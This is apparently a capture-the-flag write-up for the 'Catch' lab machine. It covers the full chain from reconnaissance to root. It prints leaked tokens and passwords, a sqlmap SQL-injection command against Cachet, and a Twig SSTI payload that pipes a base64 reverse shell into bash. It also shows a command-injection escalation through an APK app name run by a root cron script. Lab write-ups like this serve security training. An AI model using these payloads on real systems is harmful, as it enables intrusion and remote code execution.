## Port Scanning

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.41 (Ubuntu)

3000/tcp open  ppp?

5000/tcp open  upnp?

8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.29 (Ubuntu)
```


## Web Enumration 

#### Port 80

![[Pasted image 20220616121657.png]]

Static page with just an `apk` to download

#### Port 3000 
![[Pasted image 20220616121802.png]]

**Gitea** need some credentials to access which wo don't have any this point.

#### Port 5000
![[Pasted image 20220616121923.png]]

A Chatting app. It also have it's proper Documentaion on [Github](https://github.com/sdelements/lets-chat/wiki) hooked on it's login page

#### Port 8000 

![[Pasted image 20220616122159.png]]

Status Page System by **Cachet**


## Analysing APK

Analysing the apk on [MobSF](https://mobsf.live/)

Found some hard coded Secrets

![[Pasted image 20220616122710.png]]


```text
"gitea_token" : "b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0"
"lets_chat_token" : "NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="
"slack_token" : "xoxp-23984754863-2348975623103"
```

We can use these token somewhere.


## Enumrating Let's-Chat 
Since **Let's Chat** mentioned in their **[Wiki  Lets Chat | API](https://github.com/sdelements/lets-chat/wiki/API)** that we can interact with application using API with an Authenticating token.


##### Users

```shell
──(kali㉿kali)-[~/Desktop/Catch]
└─$ curl http://catch.htb:5000/users -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   931  100   931    0     0   1055      0 --:--:-- --:--:-- --:--:--  1055
[
  {
    "id": "61b86aead984e2451036eb16",
    "firstName": "Administrator",
    "lastName": "NA",
    "username": "admin",
    "displayName": "Admin",
    "avatar": "e2b5310ec47bba317c5f1b5889e96f04",
    "openRooms": [
      "61b86b28d984e2451036eb17",
      "61b86b3fd984e2451036eb18",
      "61b8708efe190b466d476bfb"
    ]
  },
  {
    "id": "61b86dbdfe190b466d476bf0",
    "firstName": "John",
    "lastName": "Smith",
    "username": "john",
    "displayName": "John",
    "avatar": "f5504305b704452bba9c94e228f271c4",
    "openRooms": [
      "61b86b3fd984e2451036eb18",
      "61b86b28d984e2451036eb17"
    ]
  },
  {
    "id": "61b86e40fe190b466d476bf2",
    "firstName": "Will",
    "lastName": "Robinson",
    "username": "will",
    "displayName": "Will",
    "avatar": "7c6143461e935a67981cc292e53c58fc",
    "openRooms": [
      "61b86b3fd984e2451036eb18",
      "61b86b28d984e2451036eb17"
    ]
  },
  {
    "id": "61b86f15fe190b466d476bf5",
    "firstName": "Lucas",
    "lastName": "NA",
    "username": "lucas",
    "displayName": "Lucas",
    "avatar": "b36396794553376673623dc0f6dec9bb",
    "openRooms": [
      "61b86b28d984e2451036eb17",
      "61b86b3fd984e2451036eb18"
    ]
  }
]
```



##### Rooms :

```shell
┌──(kali㉿kali)-[~/Desktop/Catch]
└─$ curl -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" http://catch.htb:5000/rooms | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   860  100   860    0     0    704      0  0:00:01  0:00:01 --:--:--   704
[
  {
    "id": "61b86b28d984e2451036eb17",
    "slug": "status",
    "name": "Status",
    "description": "Cachet Updates and Maintenance",
    "lastActive": "2021-12-14T10:34:20.749Z",
    "created": "2021-12-14T10:00:08.384Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b8708efe190b466d476bfb",
    "slug": "android_dev",
    "name": "Android Development",
    "description": "Android App Updates, Issues & More",
    "lastActive": "2021-12-14T10:24:21.145Z",
    "created": "2021-12-14T10:23:10.474Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b86b3fd984e2451036eb18",
    "slug": "employees",
    "name": "Employees",
    "description": "New Joinees, Org updates",
    "lastActive": "2021-12-14T10:18:04.710Z",
    "created": "2021-12-14T10:00:31.043Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  }
]
```


#### Chat of Status room

```shell
┌──(kali㉿kali)-[~/Desktop/Catch]
└─$ curl -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" http://catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2014  100  2014    0     0   2948      0 --:--:-- --:--:-- --:--:--  2953
[
  {
    "id": "61b8732cfe190b466d476c02",
    "text": "ah sure!",
    "posted": "2021-12-14T10:34:20.749Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b8731ffe190b466d476c01",
    "text": "You should actually include this task to your list as well as a part of quarterly audit",
    "posted": "2021-12-14T10:34:07.449Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b872b9fe190b466d476c00",
    "text": "Also make sure we've our systems, applications and databases up-to-date.",
    "posted": "2021-12-14T10:32:25.514Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87282fe190b466d476bff",
    "text": "Excellent! ",
    "posted": "2021-12-14T10:31:30.403Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87277fe190b466d476bfe",
    "text": "Why not. We've this in our todo list for next quarter",
    "posted": "2021-12-14T10:31:19.094Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87241fe190b466d476bfd",
    "text": "@john is it possible to add SSL to our status domain to make sure everything is secure ? ",
    "posted": "2021-12-14T10:30:25.108Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b8702dfe190b466d476bfa",
    "text": "Here are the credentials `john :  E}V!mywu_69T4C}W`",
    "posted": "2021-12-14T10:21:33.859Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87010fe190b466d476bf9",
    "text": "Sure one sec.",
    "posted": "2021-12-14T10:21:04.635Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b86fb1fe190b466d476bf8",
    "text": "Can you create an account for me ? ",
    "posted": "2021-12-14T10:19:29.677Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b86f4dfe190b466d476bf6",
    "text": "Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. ",
    "posted": "2021-12-14T10:17:49.761Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  }
]
```

And We found credentials of user **John** for **Status** page.

```text
john :  E}V!mywu_69T4C}W
```



## Getting Shell
The Cachet platform used had some vulnerabilites which we can exploit to gain RCE on the platform.

Reference : 
- [CTFiot](http://www.ctfiot.com/18914.html)
- [SQLi on Cachet](https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html)
					
So basically Cachet have a **SQLi** Vulnerability using which we can get `api_keys` of users, using those `api_keys` we can execute our `Twig SSTI` payload and gain RCE.

So after using **SQLmap** to enumrate the Database got the `api_keys`.

```shell
┌──(kali㉿kali)-[~/Desktop/Catch]
└─$ sqlmap -u "http://catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --dbms=mysql -D cachet -T users -C username,api_key --dump
```


| username | api_key              |
|----------|----------------------|
| john     | 7GVCqTY5abrox48Nct8j |
| admin    | rMSN8kJN9TPADl2cWv8N |


**Testing out RCE**
 Saving the payload as template

![[Pasted image 20220616124753.png]]

 Sending a POST request with Header `X-Cachet-Toekn` set to `api_key` of user to execute our payload.

```shell
┌──(kali㉿kali)-[~/Desktop/Catch]
└─$ curl -X POST -H "X-Cachet-Token: 7GVCqTY5abrox48Nct8j" -d "visible=0&status=1&name=aaa&template=aaa" http://catch.htb:8000/api/v1/incidents | jq
```

![[Pasted image 20220616125152.png]]

**Got the Result back !!**

Now we can save a Reverse Shell payload

```text
{{["echo <RevShell_b64> | base64 -d | bash"]|filter("system")|join(",")}}
```


## Getting User

Now that we got a reverse shell but it seems it's inside a **Docker Container**

While searching for some useful processes found an odd process.

![[Pasted image 20220616125610.png]]

On Reading that particular file found Credentials for **MySQL** server.

![[Pasted image 20220616125703.png]]


```text
will : s2#4Fg0_%3!
```

And password was re-used as for **SSH**


## Privilege Escalation

Running **linPEAS** found a readble file belonging to root

```text
-rwxr-x--x+ 1 root root 1894 Mar  3 14:23 /opt/mdm/verify.sh 
```

On running **pSPY** found that this file was being run by `root` as background process.

```text
2022/06/16 06:16:01 CMD: UID=0    PID=40022  | /usr/sbin/CRON -f 
2022/06/16 06:16:01 CMD: UID=0    PID=40021  | /usr/sbin/CRON -f 
2022/06/16 06:16:01 CMD: UID=0    PID=40025  | /bin/bash /opt/mdm/verify.sh 
2022/06/16 06:16:01 CMD: UID=0    PID=40024  | /bin/sh -c rm -rf /root/mdm/certified_apps/* 
2022/06/16 06:16:01 CMD: UID=0    PID=40023  | /bin/sh -c /opt/mdm/verify.sh 
2022/06/16 06:16:01 CMD: UID=0    PID=40029  | cut -d . -f1 
2022/06/16 06:16:01 CMD: UID=0    PID=40027  | /bin/bash /opt/mdm/verify.sh 
2022/06/16 06:16:01 CMD: UID=0    PID=40030  | openssl rand -hex 12 
2022/06/16 06:16:01 CMD: UID=0    PID=40031  | mv /opt/mdm/apk_bin/*.apk /root/mdm/apk_bin/bf88e2109676ef8333a90f11.ap
```

On reading **verify.sh** it's doing some checks on an apk file, but the `app_check()` function is doing thing which we can exploit to gain **RCE**

```bash
<SNIP>

app_check() {
        APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
        echo $APP_NAME
        if [[ $APP_NAME == *"Catch"* ]]; then
                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
                mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
        else
                echo "[!] App doesn't belong to Catch Global"
                cleanup
                exit
        fi
}

<SNIP>
```

It's fetching the `appname` from decompiled apk and then it will be directly putted into `{}` and we can inject some code along side name which we be direclty executed as root.

```bash
echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
```

So I decompiled the Catch apk which we downloaded from the website decompiled it using **apktool**

and adding Injecting Reverse Shell with `appname`

![[Pasted image 20220616131647.png]]

Then Recompiled the apk using apktool and Uploaded this apk on box inside `/opt/mdm/apk_bin` directory.

**Got the Shell as Root !!**